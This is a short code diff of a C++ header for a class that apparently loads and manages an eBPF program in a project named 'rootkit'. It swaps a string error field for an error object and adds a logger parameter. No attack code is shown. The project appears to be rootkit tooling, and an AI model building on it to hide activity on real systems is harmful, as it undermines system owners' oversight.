@@ -1,12 +1,12 @@
 #ifndef ROOTKIT_EBPF_HELPER_H
 #define ROOTKIT_EBPF_HELPER_H
 
-#include <cstdint>
 #include <string>
 #include <optional>
-#include <vector>
 #include "rootkit.skel.h"
 #include "rootkit/ConfigManager.hpp"
+#include "rootkit/issues/Error.hpp"
+#include "rootkit/issues/Logger.hpp"
 
 namespace rootkit {
 
@@ -15,7 +15,7 @@ private:
     RootkitBpfConfig conf;
     struct rootkit_bpf * skel;
     struct ring_buffer * rb;
-    std::string error_msg;
+    issues::Error error;
 
 public:
     /**
@@ -25,7 +25,9 @@ public:
      * buffer receives data
      */
     RootkitBpfHelper(const RootkitBpfConfig& conf,
-        int (* rb_callback)(void *, void *, unsigned long));
+        int (* rb_callback)(void *, void *, unsigned long),
+        const issues::Logger& logger
+    );
 
     /**
      * @brief Unload rootkit bpf
